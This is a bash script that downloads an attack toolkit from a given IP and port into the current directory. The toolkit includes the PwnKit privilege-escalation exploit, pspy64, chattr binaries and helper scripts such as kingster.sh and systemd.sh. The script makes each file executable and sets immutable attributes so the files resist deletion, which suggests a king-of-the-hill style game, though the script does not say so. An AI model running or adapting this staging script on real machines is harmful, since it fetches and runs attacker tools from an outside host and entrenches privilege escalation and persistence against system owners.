#!/bin/bash

# Check if wget exists on the system
if ! command -v wget &> /dev/null; then
    echo "Error: wget is not installed. Please install wget and try again." >&2
    exit 1
fi

# Check if wget is executable
if ! [ -x "$(command -v wget)" ]; then
    echo "${R}Error:${N} wget is not executable. Adding execute permission..."
    chmod +x "$(command -v wget)"
fi

# Check if the script is called with at least one argument (IP)
if [ $# -lt 1 ]; then
    echo "Usage: $0 <IP> [PORT]"
    exit 255
elif [ $# -lt 2 ]; then
    PORT=80  # Default HTTP port
else
    PORT="$2"
fi

# Array with files to download
files=(
    "static/changeattr"
    "kingster.sh"
    "systemd.sh"
    "check.sh"
    "PwnKit"
    "static/pspy64"
    "chattr"
    "animations/nyan"
    "animations/hello.sh"
    # "linpeas.sh"
)

# Define ANSI color codes
G='\033[0;32m'  # Green color
R='\033[0;31m'  # Red color
B='\033[0;34m'  # Blue color
N='\033[0m'     # No color

# Start message
echo -e "Output directory: ${B}$(pwd)${N}"

# Loop through the file names and use wget to download each file to the current directory
for file in "${files[@]}"; do
    url="http://$1:${PORT}/${file}"

    # Download the file and check if the download was successful
    if wget -q "$url"; then
        # Get filename
        file=$(echo "${file}" | rev | cut -d '/' -f 1 | rev)

        # Set executable permissions
        chmod u+x "${file}"

        # Proctect with changeattr
        ./changeattr -eita "${file}" &>/dev/null
        ./changeattr +eita "${file}" &>/dev/null

        echo -e "Downloaded ${G}${file}${N}"
    else
        echo -e "Failed to download ${R}${file}${N}"
    fi
done

# Prevent overwriting
for file in "${files[@]}"; do
    set -o noclobber "$(pwd)/${file}"
done

exit 0
